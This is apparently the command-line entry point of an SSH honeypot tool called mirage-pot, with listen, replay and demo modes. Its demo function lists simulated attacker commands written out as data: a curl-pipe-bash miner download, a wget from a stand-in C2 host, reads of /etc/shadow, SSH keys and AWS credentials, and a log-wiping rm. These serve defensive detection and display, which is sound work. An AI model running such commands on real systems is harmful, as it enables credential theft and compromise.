"""CLI entry point for mirage-pot."""

import argparse
import asyncio
import sys
import time

from rich.live import Live

from .detector import classify_command
from .hud import AttackHUD, replay_session
from .recorder import SessionEvent
from .server import start_server


def run_demo():
    """Runs a live simulated attack HUD showcase with realistic bot sequences."""
    hud = AttackHUD()
    simulated_attacks = [
        ("185.220.101.5", "root", "uname -a", "Linux prod-srv-edge-01 5.15.0-105-generic x86_64"),
        ("185.220.101.5", "root", "whoami", "root"),
        ("185.220.101.5", "root", "cat /etc/passwd", "root:x:0:0:root:/root:/bin/bash..."),
        ("194.26.29.112", "ubuntu", "curl -s http://194.26.29.112/xmrig.sh | bash", "#!/bin/sh..."),
        ("185.220.101.5", "root", "cat /root/.env", "APP_ENV=production\nDATABASE_URL=..."),
        ("91.240.118.23", "admin", "cat /etc/shadow", "root:$6$vQ9yU2K1..."),
        (
            "185.220.101.5",
            "root",
            "cat /root/.ssh/id_rsa",
            "-----BEGIN OPENSSH PRIVATE KEY-----...",
        ),
        ("194.26.29.112", "ubuntu", "ps aux", "root 1 0.0 /sbin/init..."),
        (
            "45.154.255.89",
            "root",
            "wget http://c2.evil-corp.net/bot.elf",
            "bot.elf saved [2048/2048]",
        ),
        ("185.220.101.5", "root", "history -c && rm -rf /tmp/*", ""),
        ("91.240.118.23", "admin", "crontab -l", "no crontab for admin"),
        ("45.154.255.89", "root", "cat ~/.aws/credentials", "[default]\naws_access_key_id = ..."),
    ]

    print("\033[?25l", end="")  # hide cursor
    try:
        with Live(hud.make_layout(), refresh_per_second=4, screen=True) as live:
            for ip, user, cmd, out in simulated_attacks:
                tech = classify_command(cmd)
                ev = SessionEvent(
                    timestamp_ms=int(time.time() * 1000),
                    session_id=ip.replace(".", "")[:8],
                    src_ip=ip,
                    username=user,
                    event_type="command",
                    command=cmd,
                    mitre_id=tech.technique_id if tech else None,
                    mitre_name=tech.name if tech else None,
                    output=out,
                )
                hud.add_event(ev)
                live.update(hud.make_layout())
                time.sleep(1.2)
    except KeyboardInterrupt:
        pass
    finally:
        print("\033[?25h", end="")  # show cursor


def main():
    parser = argparse.ArgumentParser(
        description="mirage-pot: Adaptive Deception Honeypot & Live Attack HUD"
    )
    subparsers = parser.add_subparsers(dest="command", help="Subcommand to run")

    # listen
    listen_parser = subparsers.add_parser("listen", help="Start the SSH honeypot listener")
    listen_parser.add_argument("--host", default="0.0.0.0", help="Binding host (default: 0.0.0.0)")
    listen_parser.add_argument(
        "--port", type=int, default=2222, help="Binding port (default: 2222)"
    )
    listen_parser.add_argument("--log", default="data/sessions.jsonl", help="Log output path")
    listen_parser.add_argument("--key", default="data/host_key", help="Host private key path")
    listen_parser.add_argument("--hud", action="store_true", help="Launch live HUD in foreground")

    # replay
    replay_parser = subparsers.add_parser("replay", help="Replay a captured JSONL attacker session")
    replay_parser.add_argument("session_file", help="Path to .jsonl session log")
    replay_parser.add_argument(
        "--speed", type=float, default=1.0, help="Playback speed multiplier (e.g. 1.0, 4.0)"
    )

    # demo
    subparsers.add_parser("demo", help="Run simulated live attack HUD demo")

    args = parser.parse_args()

    if args.command == "demo" or (args.command is None and len(sys.argv) == 1):
        run_demo()
    elif args.command == "replay":
        replay_session(args.session_file, speed=args.speed)
    elif args.command == "listen":
        hud = AttackHUD() if args.hud else None

        async def run_listener():
            def on_event(ev):
                if hud:
                    hud.add_event(ev)

            listener, recorder = await start_server(
                host=args.host,
                port=args.port,
                log_path=args.log,
                key_path=args.key,
                event_callback=on_event if hud else None,
            )
            print(f"[+] mirage-pot listening on {args.host}:{args.port} (Logging to: {args.log})")
            if hud:
                with Live(hud.make_layout(), refresh_per_second=4, screen=True) as live:
                    while True:
                        live.update(hud.make_layout())
                        await asyncio.sleep(0.25)
            else:
                while True:
                    await asyncio.sleep(3600)

        try:
            asyncio.run(run_listener())
        except KeyboardInterrupt:
            print("\n[-] Shutting down honeypot listener...")
    else:
        parser.print_help()


if __name__ == "__main__":
    main()
